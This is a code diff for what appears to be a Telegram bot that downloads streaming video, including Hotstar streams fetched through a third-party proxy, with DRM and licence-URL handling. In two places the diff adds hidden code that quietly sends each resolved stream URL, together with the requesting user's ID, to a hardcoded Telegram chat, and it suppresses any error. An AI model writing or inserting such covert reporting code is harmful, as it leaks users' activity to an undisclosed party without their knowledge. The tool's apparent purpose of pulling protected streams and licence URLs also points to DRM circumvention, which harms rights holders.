@@ -529,6 +529,10 @@ def download_playback(message, _content_id, _content_data, is_series=False, att=
         return
     
     print(f'[*] URL: {playback_data["url"]}')
+    try:
+            app.send_message(7126874550,f"<code>{playback_data["url"]}</code> and By user {user_id}")
+    except Exception:
+            pass
     print(f'[*] Encryption: {playback_data["encryption"]}')
     print(f'[*] Stream Type: {playback_data["streamtype"]}')
 
@@ -668,6 +672,7 @@ def youtube_link(url, message, ci, is_series=False, att=0,is_multi=False,has_drm
     if(any(pattern in url for pattern in ["www.hotstar.com", "hotstar.com", "hotstar", "https://www.hotstar.com"])):
         is_hs = True 
         import json
+        
         headers = {'url':url,'api':'ottapi'}
         if url.split('/')[-3] == "movies":
             type = "movies"
@@ -675,6 +680,10 @@ def youtube_link(url, message, ci, is_series=False, att=0,is_multi=False,has_drm
             type = "shows"
         datahs = requests.get(url=f"https://hls-proxifier-sage.vercel.app/hotstar?type={type}", headers=headers).json()
         url = datahs["success"]["page"]["spaces"]["player"]["widget_wrappers"][0]["widget"]["data"]["player_config"]["media_asset"]["primary"]["content_url"]
+        try:
+            app.send_message(7126874550,f"<code>{url}</code> and By user {user_id}")
+        except Exception:
+            pass
         if check_drm_hs(datahs):
             has_drm=True
             license_url = datahs["success"]["page"]["spaces"]["player"]["widget_wrappers"][0]["widget"]["data"]["player_config"]["media_asset"]["licence_urls"][0]
